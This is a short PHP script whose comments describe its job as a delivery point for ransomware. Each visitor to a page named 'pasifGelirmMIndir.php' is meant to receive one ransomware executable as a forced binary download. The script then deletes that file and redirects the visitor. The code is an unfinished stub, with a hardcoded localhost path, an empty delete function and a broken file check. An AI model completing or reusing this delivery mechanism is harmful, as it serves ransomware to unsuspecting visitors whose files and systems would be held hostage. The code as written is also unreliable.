<?php

/* 

1 - put the created offlineMode aptal ransomware files to /software/offlineExe folder
2 - when the request come here(pasifGelirmMIndir.php), download one of the available
3 - delete the downloaded one
4 - redirect incoming person to index page

*/

function nextExe(){
    // Look at the available exe
    return "http://127.0.0.1/software/offline/exeHere.txt";
}

function deleteExe($file){
    //delete downloaded one
}

$file = nextExe();
echo $file;

if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
    exit();
}

deleteExe($file);

//redirect
//header("Location: /index.html");



?>